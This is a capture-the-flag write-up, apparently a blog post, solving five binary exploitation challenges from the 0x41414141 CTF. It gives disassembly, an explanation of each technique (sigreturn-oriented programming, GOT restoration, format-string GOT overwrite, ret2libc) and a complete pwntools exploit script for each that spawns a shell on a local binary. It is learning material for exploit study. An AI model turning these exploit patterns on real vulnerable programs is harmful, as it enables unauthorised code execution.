## tl; dr

I think the pwn problems given in 0x41414141 CTF are very educational, so
I'll write down the solution for notes.

Disclaimer : I wrote writeup for only the problems that I could solve. Exploit code is made for local use only since the server has been dropped.

This is also my way of learning English!!

## Moving Signals

Meta data:

```
moving: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x40000)
    RWX:      Has RWX segments
```



```
0000000000041000 <__start>:
   41000:	48 c7 c7 00 00 00 00 	mov    rdi,0x0
   41007:	48 89 e6             	mov    rsi,rsp
   4100a:	48 83 ee 08          	sub    rsi,0x8
   4100e:	48 c7 c2 f4 01 00 00 	mov    rdx,0x1f4
   41015:	0f 05                	syscall 
   41017:	c3                   	ret    
   41018:	58                   	pop    rax
   41019:	c3                   	ret
```

It's very small binary. The only function included in the binary is ``` _start```.
Then, it's obvious that the program has a simple BOF, and the offset is 8 bytes.

Since the program has few gadgets, we can't exploit with simple ROP.
But... we have ```pop rax; ret;``` gadget and ```syscall; ret;``` gadget. How do we use these gadgets?

The answer is **Sigreturn oriented programming** !

By using ```rt_sigreturn``` system call, we can change the value of any register, even rip. Considering the section of ```_start``` is writable and executable, we can inject the shellcode into ```_start``` and excute it.

The attack overview:

1. cause BOF
2. put 0xf (syscall number of ```rt_sigreturn```) into rax
3. return to ```0x41015```, and cause sigreturn.
4. inject shellcode into ```0x41017```
5. execute shellcode
6. get the shell!

Using ```rt_sigreturn```, we'll set the register values as follows:
- rax : 0 (syscall number of ```read```)
- rdi : 0 (fd of standard input)
- rsi : 0x41017 (inject address)
- rdx : 0x500 (input size, it might be more than enough)
- rsp : 0x41500 (for read)
- rip : 0x41015 (to call syscall)

<details>
<summary>Exploit Code</summary>

```py
from pwn import *
elf=context.binary=ELF("./moving")
p=process("./moving")

flame=SigreturnFrame()
flame.rax=0x0
flame.rdi=0x0
flame.rsi=0x00041017
flame.rdx=0x500
flame.rip=0x00041015
flame.rsp=0x00041100

payload=p64(0)
payload+=p64(0x00041018) # pop rax; ret;
payload+=p64(0xf)
payload+=p64(0x00041015) # syscall
payload+=bytes(flame)

p.sendline(payload)
shellcode=asm(shellcraft.sh())
p.sendline(shellcode)
p.interactive()
```
</details>

Finally, we get the shell! yay!

## external

Metadata:
```
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=06cea603bc177acf3effdea190ad8a3c88a2a7a0, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Oh, this is a very simple problem! It's obvious that the program has a simple BOF too and just leak some GOT and calculate libc base address!

...wait. Annoyingly, GOT is cleared by ```clear_got``` before ```main``` return.

```
0000000000401224 <main>:
  401224:	55                   	push   rbp
  401225:	48 89 e5             	mov    rbp,rsp
  401228:	48 83 ec 50          	sub    rsp,0x50
  40122c:	48 8d 3d df 0d 00 00 	lea    rdi,[rip+0xddf]        # 402012 <_IO_stdin_used+0x12>
  401233:	e8 f8 fd ff ff       	call   401030 <puts@plt>
  401238:	48 8d 3d dd 0d 00 00 	lea    rdi,[rip+0xddd]        # 40201c <_IO_stdin_used+0x1c>
  40123f:	b8 00 00 00 00       	mov    eax,0x0
  401244:	e8 07 fe ff ff       	call   401050 <printf@plt>
  401249:	48 8d 45 b0          	lea    rax,[rbp-0x50]
  40124d:	ba f0 00 00 00       	mov    edx,0xf0
  401252:	48 89 c6             	mov    rsi,rax
  401255:	bf 00 00 00 00       	mov    edi,0x0
  40125a:	e8 21 fe ff ff       	call   401080 <read@plt>
  40125f:	b8 00 00 00 00       	mov    eax,0x0
  401264:	e8 1d ff ff ff       	call   401186 <clear_got>
  401269:	b8 00 00 00 00       	mov    eax,0x0
  40126e:	c9                   	leave  
  40126f:	c3                   	ret 
```

How do we restore GOT? Let's think about how resolving ```puts``` address works.

```
0000000000401030 <puts@plt>:
  401030:	ff 25 e2 2f 00 00    	jmp    QWORD PTR [rip+0x2fe2]        # 404018 <puts@GLIBC_2.2.5>
  401036:	68 00 00 00 00       	push   0x0
  40103b:	e9 e0 ff ff ff       	jmp    401020 <.plt>
```

When ```puts``` was first called, ```puts@GOT``` is set to ```puts@PLT + 6``` and jumps to ```puts@PLT + 6``` to resolve the address. From the second time, since ```puts@GOT``` has been set to ```puts``` address, jumps to ```puts``` without resolving the address.

Therfore, if we can set ```puts@GOT``` to ```puts@PLT + 6``` , we can restore the ```puts@GOT```. Can we do that? The answer is YES. Just ROP and read ```puts@GOT```.

However, there is still a problem. Even we restored ```puts@GOT```, ```clear_got``` will be called again. Let's see ```clear_got``` :

```
0000000000401186 <clear_got>:
  401186:	55                   	push   rbp
  401187:	48 89 e5             	mov    rbp,rsp
  40118a:	48 8d 05 87 2e 00 00 	lea    rax,[rip+0x2e87]        # 404018 <puts@GLIBC_2.2.5>
  401191:	ba 38 00 00 00       	mov    edx,0x38
  401196:	be 00 00 00 00       	mov    esi,0x0
  40119b:	48 89 c7             	mov    rdi,rax
  40119e:	e8 bd fe ff ff       	call   401060 <memset@plt>
  4011a3:	90                   	nop
  4011a4:	5d                   	pop    rbp
  4011a5:	c3                   	ret    
```

It uses ```memset``` to clear GOT. It means that if we set ```memset@GOT``` to ```puts@PLT + 6```, it won't works.

Finally, call ```puts(puts@GOT)``` to leak libc base address and call ```system("/bin/sh")``` to open the shell.

<details>
<summary>Exploit Code</summary>

```py
from pwn import *
elf=ELF("./vuln")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./vuln")

# GOT OVERWRITE
payload=b"A"*88
payload+=p64(0x004012f3) # pop rdi;ret;
payload+=p64(0)
payload+=p64(0x004012f1) # pop rsi; pop r15; ret;
payload+=p64(elf.got['puts'])
payload+=p64(0)
payload+=p64(0x00401283) # syscall;
payload+=p64(elf.symbols['main'])
p.sendlineafter(b"> ",payload)

# RESTORE GOT
payload=p64(elf.plt['puts']+0x6)
payload+=p64(elf.plt['setbuf']+0x6)
payload+=p64(elf.plt['puts']+0x6)
payload+=p64(elf.plt['puts']+0x6)
payload+=p64(elf.plt['alarm']+0x6)
payload+=p64(elf.plt['read']+0x6)
payload+=p64(elf.plt['signal']+0x6)
p.send(payload)

# LEAK LIBC
payload=b"A"*88
payload+=p64(0x004012f3) # pop rdi;ret;
payload+=p64(elf.got['puts'])
payload+=p64(elf.plt['puts'])
payload+=p64(elf.symbols['main'])
p.sendlineafter(b"> \n",payload)

puts_addr=u64(p.recv(6).ljust(8,b"\x00"))
print(hex(puts_addr))
libc_base=puts_addr-libc.symbols['puts']
print(hex(libc_base))

# OPEN THE SHELL
payload=b"A"*88
payload+=p64(0x004012f3) # pop rdi;ret;
payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
payload+=p64(libc_base+libc.symbols['system'])

p.sendline(payload)
p.interactive()
```
</details>

## The Pwn Inn

Metadata : 
```
the_pwn_inn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=14fc1c701ef6aaae7b503071e34cc157ca6a2fad, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This program has a simple FSB and the offset is 6. But, ```vuln``` will call ```exit```... How to prevent the program from exiting?

```
00000000004012c4 <vuln>:
  4012c4:	55                   	push   rbp
  4012c5:	48 89 e5             	mov    rbp,rsp
  4012c8:	48 81 ec 10 01 00 00 	sub    rsp,0x110
...
  401319:	e8 42 fd ff ff       	call   401060 <printf@plt>
  40131e:	bf 01 00 00 00       	mov    edi,0x1
  401323:	e8 88 fd ff ff       	call   4010b0 <exit@plt>
```

The answer is simple. Just use FSB to overwrite ```exit@GOT``` with ```vuln``` address. Therefore, the program will cause an infinite loop.

Next, let's leak ```puts@GOT``` to calculate libc base address! It's easy. 

Finally, overwrite ```printf@GOT``` with ```system``` address. Then, the program will call ```system(input)``` instead of ```printf(input)``` .
It means that if we input ```/bin/sh```, the program will call ```system("/bin/sh")``` and open the shell.

<details>
<summary>Exploit Code</summary>

```py
from pwn import *

elf=context.binary=ELF("./the_pwn_inn")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./the_pwn_inn")

# OVERWRITE exit@GOT
payload=fmtstr_payload(6,{elf.got['exit']:elf.symbols['vuln']})
p.sendlineafter("name? \n",payload)

# LEAK puts@GOT
payload=b"%7$sAAAA"+p64(elf.got['puts'])
p.sendlineafter("Welcome ",payload)

# CALCULATE LIBC BASE
p.recvuntil(b"Welcome ")
addr=u64(p.recv(6).ljust(8,b"\x00"))
libc_base=addr-libc.symbols['puts']

# OVERWRITE printf@GOT
payload=fmtstr_payload(6,{elf.got['printf']:libc_base+libc.symbols['system']})
p.sendline(payload)

# OPEN THE SHELL
p.sendline(b"/bin/sh")
p.interactive()
```
</details>

## Return Of The ROPs

This question asks us to answer the string of length 4 that satisfies the condition like below:

```
Proof of work: Submit a lowercase alphabetical string X, of length 4, where MD5(X)[-6:] = 394aaa
```

I wonder why. I won't touch this because it's non-essential. Now, let's move on to the main subject.

Metadata:

```
ret-of-the-rops: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7239b32103c472bb10ceb84ee69f82680317bb7c, for GNU/Linux 3.2.0, not stripped
```
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This program has a very simple BOF and solution is very typical. Just leak ```puts@GOT``` to calculate libc base address and call ```system("/bin/sh")```. There are no traps.

Why this problem is being placed here is something of a mystery.

<details>
<summary>Exploit Code</summary>

```py
from pwn import *
import hashlib
elf=ELF("./ret-of-the-rops")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
p=process("./ret-of-the-rops")

def exploit():
    # LEAK puts@GOT
    payload=b"A"*40
    payload+=p64(0x00401263) # pop rdi; ret;
    payload+=p64(elf.got['puts'])
    payload+=p64(elf.plt['puts'])
    payload+=p64(elf.symbols['main'])
    p.sendlineafter(b"What would you like to say?\n",payload)
    p.recv(43)

    # CALCULATE LIBC ADDRESS
    putsaddr=u64(p.recv(6).ljust(8,b"\x00"))
    print(hex(putsaddr))
    libc_base=putsaddr-libc.symbols['puts']
    print(hex(libc_base))

    # OPEN SHELL
    payload=b"A"*40
    payload+=p64(0x0040101a) # ret;
    payload+=p64(0x00401263) # pop rdi; ret;
    payload+=p64(libc_base+next(libc.search(b"/bin/sh")))
    payload+=p64(libc_base+libc.symbols['system'])
    payload+=p64(0x00401263) # pop rdi; ret;
    payload+=p64(0)
    payload+=p64(libc_base+libc.symbols['exit'])
    p.sendline(payload)
    p.interactive()

exploit()
```
</details>

## echo

Metadata:

```
echo: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, not stripped
```
```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
```
```
0000000000401000 <echo>:
  401000:	55                   	push   rbp
  401001:	48 89 e5             	mov    rbp,rsp
  401004:	48 81 ec 00 03 00 00 	sub    rsp,0x300
  40100b:	b8 00 00 00 00       	mov    eax,0x0
  401010:	bf 00 00 00 00       	mov    edi,0x0
  401015:	48 8d b4 24 80 01 00 	lea    rsi,[rsp+0x180]
  40101c:	00 
  40101d:	ba 00 03 00 00       	mov    edx,0x300
  401022:	0f 05                	syscall 
  401024:	48 89 c2             	mov    rdx,rax
  401027:	b8 01 00 00 00       	mov    eax,0x1
  40102c:	bf 01 00 00 00       	mov    edi,0x1
  401031:	0f 05                	syscall 
  401033:	c9                   	leave  
  401034:	c3                   	ret    
  401035:	2f                   	(bad)  
  401036:	62                   	(bad)  
  401037:	69                   	.byte 0x69
  401038:	6e                   	outs   dx,BYTE PTR ds:[rsi]
  401039:	2f                   	(bad)  
  40103a:	73 68                	jae    4010a4 <_start+0x67>
	...

000000000040103d <_start>:
  40103d:	e8 be ff ff ff       	call   401000 <echo>
  401042:	b8 3c 00 00 00       	mov    eax,0x3c
  401047:	bf 00 00 00 00       	mov    edi,0x0
  40104c:	0f 05                	syscall
```

This program is very small like moving signal.

And like moving signal, we might exploit this program by SROP.
But in this case, the program doesn't have ```pop rax;``` gadget. So, how to set ```rax``` to 0xf (syscall number of ```rt_sigreturn```)?

There is a very ad-hoc solution. The program will echo input. Therefore, if we input N bytes, ```rax``` will set to N.
It means that if we input 0xf bytes, ```rax``` will set to 0xf.

So we found out that we can use SROP. Next, let's think the flame.

The writer was kind enough to contain ```/bin/sh``` on the program. There is no way not to take advantage of this.

```
   1035 /bin/sh
   1111 ./src/main.S
   111e echo
   1123 __bss_start
   112f _edata
   1136 _end
   113c .symtab
   1144 .strtab
   114c .shstrtab
   1156 .text
```

OK, let's set the register values as follows to call ```execve("/bin/sh",0,0)```

- rax : 0x3b (syscall number of execve)
- rdi : 0x1035 (```/bin/sh```)
- rsi : 0x0
- rdx : 0x0
- rip : 0x401022

<details>
<summary>Exploit Code</summary>

```py
import time
from pwn import *
elf=context.binary=ELF("./echo")
p=process("./echo")

flame=SigreturnFrame()
flame.rax=0x3b
flame.rip=0x401022
flame.rdi=0x401035
flame.rsi=0x0
flame.rdx=0x0

payload=b"A"*392
payload+=p64(elf.symbols['echo'])
payload+=p64(0x401022)
payload+=bytes(flame)

p.sendline(payload)
time.sleep(1)
p.sendline(b"A"*0xe)
time.sleep(1)
p.interactive()
```
</details>

<hr>

How did you like it? Whenever I solve a new problem, I will add writeup.